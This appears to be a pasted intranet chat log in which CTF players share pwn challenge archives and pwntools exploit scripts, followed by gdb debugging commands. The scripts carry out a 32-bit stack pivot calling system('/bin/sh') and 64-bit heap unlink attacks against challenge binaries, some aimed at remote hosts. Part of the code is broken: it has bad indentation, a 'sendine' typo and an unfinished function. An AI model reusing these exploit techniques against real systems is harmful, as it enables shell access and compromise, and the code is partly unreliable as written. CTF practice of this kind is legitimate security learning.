x/30xg  【内网通】群组聊天消息通过内网传输，不经过外网服务器，保证您的信息安全，不受监控，请放心畅聊。
2019-06-22 09:05:05
。
 文件【C:\Users\Public\Nwt\cache\recv\ZoE\task_flag_heap_7865397BC2C82C08FD94553896D1BCE6.zip】接收成功。  打开  打开文件夹
 文件【C:\Users\Public\Nwt\cache\recv\ZoE\task_pwn_L10YAqn.rar】接收成功。  打开  打开文件夹
 文件【C:\Users\Public\Nwt\cache\recv\ZoE\task_pwn_bec89474decdf9e41b70d82a4a2787ce.zip】接收成功。  打开  打开文件夹
 文件【C:\Users\Public\Nwt\cache\recv\ZoE\task_pwn.rar】接收成功。  打开  打开文件夹
 文件【C:\Users\Public\Nwt\cache\recv\ZoE\task_pwn.zip】接收成功。  打开  打开文件夹
09:51:52
from pwn import *
LOCAL = 1
DEBUG = 1
if DEBUG:
    context.log_level = 'debug'
if LOCAL:
    p = process('./pwn')#,env={'LD_PRELOAD':'./ld-2.29.so'})
    #libc = ELF('./libc-2.29.so')
else:
    p = remote('111.198.29.45',32003)
    #libc = ELF('./libc-2.29.so')
main = 0x8048595
bss = 0x0804A100
leave = 0x08048561
elf = ELF("./pwn")
system_plt = elf.plt["system"]
def exp():
payload = "a"*40 + p32(bss) + p32(0x080485B1) + p32(0xeeeeee)
gdb.attach(p,"b *0x080485B1")
p.recv()
p.sendine("a"*40 + p32(bss) + p32(0x804854B))
p.send(payload)
payload2 = "/bin/sh\x00" + p32(0x804a0e4) + p32(system_plt) + p32(0) + p32(bss-0x28)
payload2 = payload2.ljust(40,"\x00") 
payload2 += p32(0x804a0e0) + p32(leave)
p.recv()
p.send(payload2)
sleep(0.5)
p.send(payload2)
def exp2():
payload = "a"*44 + p32()
exp()
p.interactive()
10:22:09
liming
https://blog.csdn.net/qq_19876131/article/details/53674972
10:38:24
10:52:04
ZoE
from pwn import *
context(os='linux',arch='amd64',aslr = 'False')#,log_level='debug')
local = 1
#log_level='debug'
if local:
p = process("./pwn")#,env={'LD_PRELOAD':'./libc_x64.so.6'})
elf = ELF("./pwn")
#libc = ELF('./libc_x64.so.6')
else:
#p = remote('192.168.210.11',11006)
p = remote('chall.pwnable.tw',10001)
elf = ELF("./pwn")
#libc = ELF('./libc_x64.so.6')
def new(index,size,content):
    p.recvuntil("show\n")
    p.sendline("1")
    p.recvuntil(":\n")
    p.sendline(str(index))
    p.recvuntil(":\n")
    p.sendline(str(size))
    p.recvuntil("gift: ")
    leak = p.recvuntil("\n",drop = True)
    heap = int(leak,16)
    print("[+] heap = " + str(hex(heap)))
    p.recvuntil(":\n")
    p.sendline(content)
    return heap
def delete(index):
    p.recvuntil("show\n")
    p.sendline("2")
    p.recvuntil(":\n")
    p.sendline(str(index))
def edit(index,content):
    p.recvuntil("show\n")
    p.sendline("3")
    p.recvuntil(":\n")
    p.sendline(str(index))
    p.recvuntil(":\n")
    p.send(content)
def show():
    p.recvuntil(":")
    p.sendline("4")
'''
b *0x400990
b *0x400A61
b *0x400B73
'''
# if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
bss=0x6020e0+0x18
f=bss-0x18
b=bss-0x10
payload = p64(f) + p64(b)
leak = new(0,0xf8,payload)
print("[+] leak = " + str(hex(leak)))
heap = leak - 0x10
new(1,0xf8,payload)
new(2,0xf8,payload)
new(3,0xf8,payload)
new(4,0xf8,payload)
new(5,0xf8,payload)
new(6,0xf9,"AAA")
new(8,0xf8,"AAA")
pause()
payload = p64(0) + p64(0xf1) + p64(f) + p64(b)
edit(3,payload.ljust(0xf0, "\x00") + p64(0xf0))
delete(4)
p.interactive()
10:59:17
11:10:29
ZoE
from pwn import *
context(os='linux',arch='amd64',aslr = 'False')#,log_level='debug')
local = 1
#log_level='debug'
if local:
p = process("./pwn")#,env={'LD_PRELOAD':'./libc_x64.so.6'})
elf = ELF("./pwn")
#libc = ELF('./libc_x64.so.6')
else:
#p = remote('192.168.210.11',11006)
p = remote('chall.pwnable.tw',10001)
elf = ELF("./pwn")
#libc = ELF('./libc_x64.so.6')
def new(index,size,content):
    p.recvuntil("show\n")
    p.sendline("1")
    p.recvuntil(":\n")
    p.sendline(str(index))
    p.recvuntil(":\n")
    p.sendline(str(size))
    p.recvuntil("gift: ")
    leak = p.recvuntil("\n",drop = True)
    heap = int(leak,16)
    print("[+] heap = " + str(hex(heap)))
    p.recvuntil(":\n")
    p.sendline(content)
    return heap
def delete(index):
    p.recvuntil("show\n")
    p.sendline("2")
    p.recvuntil(":\n")
    p.sendline(str(index))
def edit(index,content):
    p.recvuntil("show\n")
    p.sendline("3")
    p.recvuntil(":\n")
    p.sendline(str(index))
    p.recvuntil(":\n")
    p.send(content)
def show():
    p.recvuntil(":")
    p.sendline("4")
'''
b *0x400990
b *0x400A61
b *0x400B73
'''
# if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
bss=0x6021c0+0x18
f=bss-0x18
b=bss-0x10
payload = p64(f) + p64(b)
leak = new(28,0xf8,payload)
print("[+] leak = " + str(hex(leak)))
heap = leak - 0x10
new(29,0xf8,payload)
new(30,0xf8,payload)
new(31,0xf8,payload)
new(32,0xf8,payload)
pause()
payload = p64(0) + p64(0xf1) + p64(f) + p64(b)
edit(31,payload.ljust(0xf0, "\x00") + p64(0xf0))
delete(32)
#edit(31,"A".ljust(0xf8, "\xAA"))
p.interactive()
c
q
q
x/30xg 0x6021c0
x/100xg 0x00000000006021c0
c
x/30xg 0400ABA
x/30xg 0x6020E8
xinfo 0x00007ffff7dd1b10
x/xg 00000000006022BC
x/xg 0x00000000006022BC
c
x/xg 0x00000000006022BC
c
c
c
c
x/xg 00000000006022BC
x/30xg 0x6020E8
xinfo 0x0000000000603600
q
q
